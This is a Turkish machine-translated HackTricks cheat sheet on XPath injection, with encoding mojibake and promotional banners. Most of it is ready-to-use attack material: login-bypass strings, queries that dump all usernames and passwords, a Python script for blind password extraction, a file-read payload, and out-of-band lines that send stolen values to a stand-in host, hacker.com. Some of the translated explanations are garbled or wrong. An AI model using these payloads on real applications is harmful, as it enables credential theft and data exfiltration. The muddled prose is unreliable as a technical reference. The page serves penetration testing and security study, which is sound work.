# XPATH enjeksiyonu

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramanla Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** katkÄ±da bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ±yla iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± ele alan iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avÄ± baÅŸlatmalarÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!**

## Temel SÃ¶zdizimi

XPath (XML Yol Dili) sorgularÄ±nÄ± kullanÄ±cÄ± giriÅŸine dayalÄ± olarak oluÅŸturan uygulamalardan yararlanmak iÃ§in XPath Enjeksiyonu adÄ± verilen bir saldÄ±rÄ± tekniÄŸi kullanÄ±lÄ±r.

### TanÄ±mlanan DÃ¼ÄŸÃ¼mler

XML belgesinde Ã§eÅŸitli dÃ¼ÄŸÃ¼mleri seÃ§mek iÃ§in ifadeler kullanÄ±lÄ±r. Bu ifadeler ve aÃ§Ä±klamalarÄ± aÅŸaÄŸÄ±da Ã¶zetlenmiÅŸtir:

- **nodename**: "nodename" adÄ±nda tÃ¼m dÃ¼ÄŸÃ¼mler seÃ§ilir.
- **/**: SeÃ§im kÃ¶k dÃ¼ÄŸÃ¼mden yapÄ±lÄ±r.
- **//**: GeÃ§erli dÃ¼ÄŸÃ¼mdeki seÃ§ime uyan dÃ¼ÄŸÃ¼mler seÃ§ilir, belgedeki konumlarÄ±na bakÄ±lmaksÄ±zÄ±n.
- **.**: GeÃ§erli dÃ¼ÄŸÃ¼m seÃ§ilir.
- **..**: GeÃ§erli dÃ¼ÄŸÃ¼mÃ¼n Ã¼st dÃ¼ÄŸÃ¼mÃ¼ seÃ§ilir.
- **@**: Ã–znitelikler seÃ§ilir.

### XPath Ã–rnekleri

Yol ifadeleri ve sonuÃ§larÄ±na Ã¶rnekler ÅŸunlarÄ± iÃ§erir:

- **bookstore**: "bookstore" adÄ±nda tÃ¼m dÃ¼ÄŸÃ¼mler seÃ§ilir.
- **/bookstore**: KÃ¶k element olan bookstore seÃ§ilir. Bir elementin mutlak yolu, bir eÄŸik Ã§izgi (/) ile baÅŸlayan bir yol ile temsil edilir.
- **bookstore/book**: bookstore'un Ã§ocuklarÄ± olan tÃ¼m book elementleri seÃ§ilir.
- **//book**: Belgedeki tÃ¼m book elementleri seÃ§ilir, konumlarÄ±na bakÄ±lmaksÄ±zÄ±n.
- **bookstore//book**: bookstore elementinin altÄ±nda bulunan tÃ¼m book elementleri seÃ§ilir, konumlarÄ±na bakÄ±lmaksÄ±zÄ±n.
- **//@lang**: lang adÄ±nda tÃ¼m Ã¶znitelikler seÃ§ilir.

### PredikatlarÄ±n KullanÄ±mÄ±

SeÃ§imleri geliÅŸtirmek iÃ§in predikatlar kullanÄ±lÄ±r:

- **/bookstore/book[1]**: bookstore elementinin ilk book elementi seÃ§ilir. IE 5'ten 9'a kadar olan sÃ¼rÃ¼mler iÃ§in, ilk dÃ¼ÄŸÃ¼mÃ¼ [0] olarak indeksleyen bir Ã§Ã¶zÃ¼m, JavaScript aracÄ±lÄ±ÄŸÄ±yla SelectionLanguage'i XPath olarak ayarlamaktÄ±r.
- **/bookstore/book[last()]**: bookstore elementinin son book elementi seÃ§ilir.
- **/bookstore/book[last()-1]**: bookstore elementinin sondan bir Ã¶nceki book elementi seÃ§ilir.
- **/bookstore/book[position()<3]**: bookstore elementinin ilk iki book elementi seÃ§ilir.
- **//title[@lang]**: lang Ã¶zniteliÄŸi olan tÃ¼m title elementleri seÃ§ilir.
- **//title[@lang='en']**: "lang" Ã¶zniteliÄŸi deÄŸeri "en" olan tÃ¼m title elementleri seÃ§ilir.
- **/bookstore/book[price>35.00]**: fiyatÄ± 35.00'den bÃ¼yÃ¼k olan bookstore'un tÃ¼m book elementleri seÃ§ilir.
- **/bookstore/book[price>35.00]/title**: fiyatÄ± 35.00'den bÃ¼yÃ¼k olan bookstore'un tÃ¼m book elementlerinin title elementleri seÃ§ilir.

### Bilinmeyen DÃ¼ÄŸÃ¼mlerin Ä°ÅŸlenmesi

Bilinmeyen dÃ¼ÄŸÃ¼mleri eÅŸleÅŸtirmek iÃ§in joker karakterleri kullanÄ±lÄ±r:

- **\***: Herhangi bir element dÃ¼ÄŸÃ¼mÃ¼yle eÅŸleÅŸir.
- **@***: Herhangi bir Ã¶znitelik dÃ¼ÄŸÃ¼mÃ¼yle eÅŸleÅŸir.
- **node()**: Herhangi bir tÃ¼rdeki herhangi bir dÃ¼ÄŸÃ¼mle eÅŸleÅŸir.

Daha fazla Ã¶rnek ÅŸunlarÄ± iÃ§erir:

- **/bookstore/\***: bookstore elementinin tÃ¼m Ã§ocuk element dÃ¼ÄŸÃ¼mlerini seÃ§er.
- **//\***: Belgedeki tÃ¼m elementleri seÃ§er.
- **//title[@\*]**: Herhangi bir tÃ¼rde en az bir Ã¶zniteliÄŸe sahip tÃ¼m title elementlerini seÃ§er.


## Ã–rnek
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
<name>pepe</name>
<password>peponcio</password>
<account>admin</account>
</user>
<user>
<name>mark</name>
<password>m12345</password>
<account>regular</account>
</user>
<user>
<name>fino</name>
<password>fino2</password>
<account>regular</account>
</user>
</data>
```
### Bilgilere EriÅŸim

XPath enjeksiyonu, bir web uygulamasÄ±nÄ±n veritabanÄ±na XPath sorgularÄ± gÃ¶ndererek hedefin hassas bilgilerine eriÅŸmeyi amaÃ§layan bir saldÄ±rÄ± tekniÄŸidir. Bu saldÄ±rÄ± tekniÄŸi, web uygulamasÄ±nÄ±n giriÅŸ alanlarÄ±na kÃ¶tÃ¼ niyetli XPath ifadeleri enjekte ederek gerÃ§ekleÅŸtirilir.

XPath enjeksiyonu saldÄ±rÄ±sÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Hedef web uygulamasÄ±nÄ± analiz edin ve XPath sorgularÄ±nÄ±n nasÄ±l oluÅŸturulduÄŸunu anlayÄ±n.
2. GiriÅŸ alanlarÄ±na kÃ¶tÃ¼ niyetli XPath ifadeleri enjekte edin.
3. Enjekte edilen XPath ifadeleriyle hedefin veritabanÄ±nÄ± sorgulayÄ±n.
4. Elde edilen sonuÃ§larÄ± analiz ederek hassas bilgilere eriÅŸin.

XPath enjeksiyonu saldÄ±rÄ±sÄ±yla hedefin veritabanÄ±na eriÅŸebilir ve kullanÄ±cÄ± kimlik bilgileri, ÅŸifreler, finansal veriler gibi hassas bilgileri elde edebilirsiniz. Bu nedenle, web uygulamalarÄ±nÄ±n XPath enjeksiyonu saldÄ±rÄ±larÄ±na karÅŸÄ± korunmasÄ± Ã¶nemlidir.
```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```
### Åema TanÄ±mlama ve Ã‡alma

XPath enjeksiyonu, bir web uygulamasÄ±nÄ±n veritabanÄ± ÅŸemasÄ±nÄ± tanÄ±mlamak ve Ã§almak iÃ§in kullanÄ±labilir. Åema, veritabanÄ±nÄ±n yapÄ±sÄ±nÄ± ve iÃ§erdiÄŸi tablolarÄ±, sÃ¼tunlarÄ± ve iliÅŸkileri belirtir. Bu bilgiler, saldÄ±rganÄ±n hedef uygulamanÄ±n veritabanÄ±na eriÅŸim saÄŸlamasÄ±na ve daha fazla saldÄ±rÄ± yapmasÄ±na yardÄ±mcÄ± olabilir.

XPath enjeksiyonu kullanarak ÅŸema bilgilerini Ã§almak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Ä°lk olarak, hedef uygulamada XPath enjeksiyonu aÃ§Ä±ÄŸÄ± arayÄ±n. Bu genellikle kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan giriÅŸlerin doÄŸrudan XPath sorgularÄ±na dahil edildiÄŸi yerlerde bulunabilir.

2. XPath enjeksiyonu aÃ§Ä±ÄŸÄ± bulduktan sonra, hedef uygulamanÄ±n veritabanÄ±yla iletiÅŸim kurmak iÃ§in kullanÄ±lan XPath sorgusunu belirleyin. Bu sorgu genellikle web uygulamasÄ±nÄ±n arka planÄ±nda Ã§alÄ±ÅŸan bir veritabanÄ± sorgusu olacaktÄ±r.

3. XPath sorgusunu manipÃ¼le etmek iÃ§in kullanabileceÄŸiniz XPath ifadelerini Ã¶ÄŸrenin. Bu ifadeler, XPath sorgusunu deÄŸiÅŸtirerek ÅŸema bilgilerini Ã§almak iÃ§in kullanÄ±labilir.

4. Åema bilgilerini Ã§almak iÃ§in XPath ifadelerini kullanarak XPath sorgusunu manipÃ¼le edin. Ã–rneÄŸin, `concat()` fonksiyonunu kullanarak sÃ¼tun adlarÄ±nÄ± veya tablo adlarÄ±nÄ± Ã§alabilirsiniz.

5. ManipÃ¼le edilmiÅŸ XPath sorgusunu hedef uygulamaya gÃ¶nderin ve yanÄ±tÄ± analiz edin. YanÄ±tta ÅŸema bilgilerini iÃ§eren veriler bulunabilir.

XPath enjeksiyonu kullanarak ÅŸema bilgilerini Ã§almak, saldÄ±rganÄ±n hedef uygulamadaki veritabanÄ± yapÄ±sÄ±nÄ± anlamasÄ±na ve daha fazla saldÄ±rÄ± yapmasÄ±na yardÄ±mcÄ± olabilir. Bu nedenle, web uygulamalarÄ±nÄ±n XPath enjeksiyonu aÃ§Ä±klarÄ±na karÅŸÄ± korunmasÄ± Ã¶nemlidir.
```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
<a>
<b></b>
</a>
<c>
<d></d>
<e></e>
<f>
<h></h>
</f>
</c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```
## Kimlik DoÄŸrulama Atlama

### **SorgularÄ±n Ã–rneÄŸi:**
```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```
### **KullanÄ±cÄ± adÄ± ve ÅŸifrede OR atlatma (her ikisinde de aynÄ± deÄŸer)**

Bir XPath enjeksiyon saldÄ±rÄ±sÄ± sÄ±rasÄ±nda, hedeflenen web uygulamasÄ±nÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifre alanlarÄ±nda aynÄ± deÄŸeri kullanarak OR operatÃ¶rÃ¼nÃ¼ atlayabilirsiniz. Bu, kullanÄ±cÄ± adÄ± ve ÅŸifre alanlarÄ±nÄ±n aynÄ± deÄŸeri kontrol etmek iÃ§in kullanÄ±ldÄ±ÄŸÄ± durumlarda etkili olabilir.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki XPath ifadesini kullanarak bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirebilirsiniz:

```plaintext
' or '1'='1
```

Bu ifade, kullanÄ±cÄ± adÄ± ve ÅŸifre alanlarÄ±nda herhangi bir deÄŸer girilmediÄŸinde veya doÄŸrulama iÅŸlemi sÄ±rasÄ±nda herhangi bir hata oluÅŸtuÄŸunda geÃ§erli bir kullanÄ±cÄ± oturumu aÃ§manÄ±za olanak tanÄ±r. Bu, kullanÄ±cÄ± adÄ± ve ÅŸifre alanlarÄ±nÄ±n aynÄ± deÄŸeri kontrol etmek iÃ§in kullanÄ±ldÄ±ÄŸÄ± durumlarda kullanÄ±ÅŸlÄ± olabilir.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki XPath ifadesiyle birlikte bir giriÅŸ yapmayÄ± deneyebilirsiniz:

```plaintext
//input[@name='username' and @value='admin' or '1'='1']
```

Bu, kullanÄ±cÄ± adÄ± alanÄ±nda "admin" deÄŸerini kontrol ederken ÅŸifre alanÄ±nda herhangi bir deÄŸer girilmediÄŸinde veya hata oluÅŸtuÄŸunda geÃ§erli bir oturum aÃ§manÄ±za olanak tanÄ±r.

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirirken, hedeflenen web uygulamasÄ±nÄ±n gÃ¼venlik Ã¶nlemlerini aÅŸmak iÃ§in dikkatli olmanÄ±z Ã¶nemlidir. AyrÄ±ca, bu saldÄ±rÄ±nÄ±n yasal izinler Ã§erÃ§evesinde gerÃ§ekleÅŸtirildiÄŸinden emin olun.
```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```
### **Null enjeksiyonunu kÃ¶tÃ¼ye kullanma**

Null enjeksiyonu, XPath ifadelerinde kullanÄ±lan bir tekniktir. XPath ifadeleri, XML belgelerindeki verilere eriÅŸmek iÃ§in kullanÄ±lÄ±r. Null enjeksiyonu, XPath ifadelerindeki hatalÄ± bir ÅŸekilde iÅŸlenen null deÄŸerlerini kullanarak hedef sistemdeki verilere eriÅŸmeyi amaÃ§lar.

Null enjeksiyonunu kullanarak, hedef sistemin XPath ifadelerini manipÃ¼le edebilir ve istenilen verilere eriÅŸebilirsiniz. Bu saldÄ±rÄ± tekniÄŸi, hedef sistemin gÃ¼venlik aÃ§Ä±klarÄ±nÄ± ortaya Ã§Ä±karabilir ve hassas bilgilere eriÅŸim saÄŸlayabilir.

Null enjeksiyonunu gerÃ§ekleÅŸtirmek iÃ§in, hedef sistemin XPath ifadelerini analiz etmek ve null deÄŸerlerin nasÄ±l iÅŸlendiÄŸini anlamak Ã¶nemlidir. Null deÄŸerlerin hedef sistemin XPath ifadelerinde nasÄ±l iÅŸlendiÄŸini belirledikten sonra, manipÃ¼lasyon yapabilir ve hedef sisteme eriÅŸim saÄŸlayabilirsiniz.

Null enjeksiyonu, hedef sistemin gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmek ve verilere eriÅŸmek iÃ§in etkili bir tekniktir. Ancak, bu saldÄ±rÄ± tekniÄŸini kullanÄ±rken dikkatli olmalÄ± ve yasal izinler Ã§erÃ§evesinde hareket etmelisiniz.
```
Username: ' or 1]%00
```
### **KullanÄ±cÄ± adÄ±nda veya ÅŸifrede Ã‡ift VEYA** (yalnÄ±zca 1 zayÄ±f alanla geÃ§erli)

Ã–NEMLÄ°: **"ve" iÅŸlemi ilk olarak gerÃ§ekleÅŸtirilir**.
```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2Âº account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```
## Dize Ã§Ä±karma

Ã‡Ä±ktÄ±, dizeler iÃ§erir ve kullanÄ±cÄ± deÄŸerleri manipÃ¼le ederek arama yapabilir:
```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
### **DeÄŸerin uzunluÄŸunu alÄ±n ve karÅŸÄ±laÅŸtÄ±rmalarla Ã§Ä±karÄ±n:**

```plaintext
' or string-length(/root/user[username='admin' and password='pass'])=10 or '1'='2
```

Bu sorgu, `admin` kullanÄ±cÄ± adÄ± ve `pass` ÅŸifresiyle eÅŸleÅŸen kullanÄ±cÄ±nÄ±n deÄŸerinin uzunluÄŸunu kontrol eder. EÄŸer uzunluk 10 ise, sorgu doÄŸru kabul edilir ve sonuÃ§ olarak `1` dÃ¶ndÃ¼rÃ¼lÃ¼r. Aksi takdirde, sorgu yanlÄ±ÅŸ kabul edilir ve sonuÃ§ olarak `2` dÃ¶ndÃ¼rÃ¼lÃ¼r.

### **Extract a value character by character using substring:**
```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```
### **Python Ã–rneÄŸi**
```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
if ("TRUE_COND" in r.text):
l = i
break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
for al in alphabet:
r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
if ("TRUE_COND" in r.text):
flag += al
print("[+] Flag: " + flag)
break
```
### Dosya Okuma

XPath enjeksiyonu, hedef web uygulamasÄ±nda XPath ifadelerini manipÃ¼le ederek hedefin dosya sistemindeki dosyalarÄ± okumak iÃ§in kullanÄ±lan bir saldÄ±rÄ± tekniÄŸidir. Bu saldÄ±rÄ± tekniÄŸi, hedef uygulamanÄ±n gÃ¼venlik aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rerek hassas verilere eriÅŸim saÄŸlayabilir.

XPath ifadeleri, XML belgelerinde belirli dÃ¼ÄŸÃ¼mleri seÃ§mek iÃ§in kullanÄ±lan bir dil olan XPath ile oluÅŸturulur. Bu ifadeler, web uygulamalarÄ±nda genellikle veritabanÄ± sorgularÄ±nÄ± oluÅŸturmak iÃ§in kullanÄ±lÄ±r. XPath enjeksiyonu saldÄ±rÄ±sÄ±, hedef uygulamanÄ±n XPath ifadelerini gÃ¼venli bir ÅŸekilde iÅŸletememesinden kaynaklanÄ±r.

XPath enjeksiyonu saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in, saldÄ±rgan hedef uygulamaya zararlÄ± XPath ifadeleri gÃ¶nderir. Bu ifadeler, hedef uygulamanÄ±n XPath iÅŸleme motoru tarafÄ±ndan doÄŸru bir ÅŸekilde yorumlanmadÄ±ÄŸÄ±nda, hedefin dosya sistemindeki dosyalarÄ±n iÃ§eriÄŸini ifÅŸa edebilir.

XPath enjeksiyonu saldÄ±rÄ±sÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Hedef uygulamada XPath ifadelerini manipÃ¼le etmek iÃ§in uygun bir giriÅŸ noktasÄ± bulun.
2. ZararlÄ± XPath ifadelerini oluÅŸturun ve hedef uygulamaya gÃ¶nderin.
3. Hedef uygulamanÄ±n yanÄ±tÄ±nÄ± analiz ederek, hedefin dosya sistemindeki dosyalarÄ±n iÃ§eriÄŸini elde edin.

XPath enjeksiyonu saldÄ±rÄ±sÄ±nÄ± gerÃ§ekleÅŸtirirken, hedef uygulamanÄ±n gÃ¼venlik aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in dikkatli olmanÄ±z Ã¶nemlidir. AyrÄ±ca, saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirirken hedef uygulamanÄ±n hizmet kalitesini etkilememeye dikkat etmelisiniz.
```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```
## OOB SÃ¶mÃ¼rÃ¼sÃ¼

Out-of-Band (OOB) exploitation, also known as blind XPath injection, is a technique used to extract data from a vulnerable application by leveraging the application's ability to make external requests. This technique is commonly used when the application does not directly display the extracted data, but instead sends it to an external entity.

Out-of-Band (OOB) sÃ¶mÃ¼rÃ¼sÃ¼, aynÄ± zamanda kÃ¶r XPath enjeksiyonu olarak da bilinen, hassas bir uygulamadan veri Ã§Ä±karmak iÃ§in uygulamanÄ±n harici istekler yapabilme yeteneÄŸini kullanma tekniÄŸidir. Bu teknik, uygulama Ã§Ä±karÄ±lan veriyi doÄŸrudan gÃ¶rÃ¼ntÃ¼lemediÄŸinde, bunun yerine harici bir varlÄ±ÄŸa gÃ¶nderdiÄŸinde yaygÄ±n olarak kullanÄ±lÄ±r.

### OOB Exploitation Techniques

OOB exploitation can be achieved using various techniques, including:

- **DNS Exfiltration**: In this technique, the extracted data is encoded and sent as part of a DNS query to a controlled domain. The attacker can then monitor the DNS server logs to retrieve the exfiltrated data.

- **HTTP Callbacks**: This technique involves encoding the extracted data and sending it as part of an HTTP request to a server controlled by the attacker. The attacker can then capture the incoming requests to retrieve the exfiltrated data.

- **SMTP Requests**: In this technique, the extracted data is encoded and sent as part of an email to an email server controlled by the attacker. The attacker can then monitor the email server logs to retrieve the exfiltrated data.

- **FTP Requests**: This technique involves encoding the extracted data and sending it as part of an FTP request to an FTP server controlled by the attacker. The attacker can then monitor the FTP server logs to retrieve the exfiltrated data.

### OOB Exploitation Tools

There are several tools available for performing OOB exploitation, including:

- **Burp Suite**: Burp Suite is a popular web application testing tool that includes features for OOB exploitation, such as the ability to send OOB requests and monitor the responses.

- **SQLMap**: SQLMap is a powerful tool for automated SQL injection and can also be used for OOB exploitation by leveraging its OOB features.

- **Custom Scripts**: Custom scripts can be developed using programming languages like Python or Ruby to perform OOB exploitation. These scripts can be tailored to the specific requirements of the target application.

### Mitigation Techniques

To mitigate OOB exploitation, it is important to implement proper input validation and sanitization techniques. Additionally, the following measures can be taken:

- **Whitelisting**: Implement a whitelist of allowed characters and validate user input against this whitelist.

- **Parameterized Queries**: Use parameterized queries or prepared statements to prevent SQL injection attacks, which can be used as a stepping stone for OOB exploitation.

- **Input Length Limitations**: Enforce limitations on the length of user input to prevent potential OOB attacks.

- **Regular Expression Filtering**: Apply regular expression filtering to validate user input and block any malicious patterns.

- **Security Testing**: Regularly perform security testing, including penetration testing, to identify and address any vulnerabilities that could be exploited for OOB attacks.
```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```
### Otomatik araÃ§

* [xcat](https://xcat.readthedocs.io/)
* [xxxpwn](https://github.com/feakk/xxxpwn)
* [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart)
* [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
* [XmlChor](https://github.com/Harshal35/XMLCHOR)

## Referanslar
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
* [https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)](https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
* [https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath\_syntax.asp)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Insights**\
Hacking'in heyecanÄ±na ve zorluklarÄ±na dalmÄ±ÅŸ iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avlarÄ± baÅŸlatma ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi edinin

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* Hacking hilelerinizi gÃ¶ndererek **HackTricks** ve **HackTricks Cloud** github depolarÄ±na katkÄ±da bulunun.

</details>
